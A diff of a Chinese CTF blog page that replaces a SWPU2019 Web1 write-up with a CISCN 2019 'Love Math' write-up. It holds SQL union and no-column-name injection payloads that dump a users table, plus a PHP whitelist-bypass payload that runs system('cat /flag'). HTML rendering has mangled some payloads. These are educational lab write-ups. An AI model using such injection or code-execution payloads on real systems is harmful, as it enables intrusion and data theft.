@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">[SWPU2019]Web1 | Troye</title>
+  <title itemprop="name">[CISCN 2019 初赛]Love Math | Troye</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -346,11 +346,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086791.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086791.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/21313213.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/21313213.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      [SWPU2019]Web1</h1>
+      [CISCN 2019 初赛]Love Math</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -362,7 +362,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-7-20<span class="bull">
+        2020-7-21<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -376,20 +376,11 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>广告版处存在注入，</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720200720221323.png" alt=""></p>
-<p>先fuzz测试一波：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720200720221548.png" alt=""></p>
-<p>过滤的东西不多。<br>接下来先爆列数<br>order被过滤，还可以用group by<br>1’/<strong>/group/</strong>/by/**/22,’1</p>
-<p>一共有二十二列。。。<br>or被过滤，information_schema不能使用，这里要用到无列名注入。<br>-1’/<strong>/union/</strong>/select/<strong>/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22<br>回显位是2，3.<br>查数据库<br>-1’union/</strong>/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22<br>发现是马里奥数据库<br>百度搜到了这个可以利用的：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/qqqqqqqqq.png" alt=""></p>
-<p>查表<br>-1’union/<strong>/select/</strong>/1,(select/<strong>/group_concat(table_name)/</strong>/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200720233720.png" alt=""></p>
-<p>无列名注入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/32131231.png" alt=""></p>
-<p>设第二列别名为b<br>-1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(b)/<strong>/from/</strong>/(select/<strong>/1,2/</strong>/as/<strong>/b,3/</strong>/union/<strong>/select/</strong>/<em>/*</em>/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200720234508.png" alt=""></p>
-<p>设第三列别名为b<br>-1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(b)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/as/<strong>/b/</strong>/union/<strong>/select/</strong>/<em>/*</em>/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200720234807.png" alt=""></p>
+          <p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720200721214021.png" alt=""></p>
+<p>1、长度要小于80<br>2、不包含黑名单中的字符<br>3、只含白名单内的字符串/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/</p>
+<p>首先来提一个概念：php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);<br>$a=’system’;<br>$a(‘ls’);</p>
+<p>可以尝试构造GET[]然后在传入想用的exp，但是这里把中括号下划线禁用了，那么就得需要编码绕过了。<br>通过白名单我们看到了一些可能帮助我们编码绕过的函数 base_convert ，dechex，第一个可以进行进制之间的转换，比如 base_convert(“1001”2,10)是将二进制的1001转换为10进制，第二个函数是将10进制转成16进制。<br>payload：?c=$_GET<a href="$_GET[b]">a</a>&amp;a=system&amp;b=cat falg<br>中括号被禁用我们可以用花括号代替{}，要构造的字符串为 _GET,php中有将16进制转成字符串的函数hex2bin，那么hex2bin又怎么生成呢，这时就需要我们的base_convert函数了，36进制也就是base36中有字母数字正好可以满足。<br>所以 base_convert(37907361743,10,36)=hex2bin。因为我们是要得到_GET所以就得用到另外一个函数dechex将_GET的10进制转为16进制再通过hex2bin转换为字符串<br>所以_GET=base_convert(37907361743,10,36)(dechex(1598506324));<br>既然已经可以构造出$_GET[]了，那么直接将上面的payload修改下即可</p>
+<p>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi=system&amp;abs=cat /flag</p>
 
         </div>
         <!-- .entry-content -->
@@ -421,15 +412,15 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2020/07/21/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/" rel="prev">
+            <a href="/2020/07/21/WesternCTF2018-shrine/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/21313213.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/21313213.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086450.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086450.png">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                [CISCN 2019 初赛]Love Math</h3>
+                [WesternCTF2018]shrine</h3>
                 <hr>
               </div>
             </a>
@@ -439,15 +430,15 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2020/07/19/BJDCTF2020-The-mystery-of-ip/" rel="next">
+            <a href="/2020/07/20/SWPU2019-Web1/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/fwefwegfw.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/fwefwegfw.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086791.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086791.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                [BJDCTF2020]The mystery of ip</h3>
+                [SWPU2019]Web1</h3>
                 <hr>
               </div>
             </a>
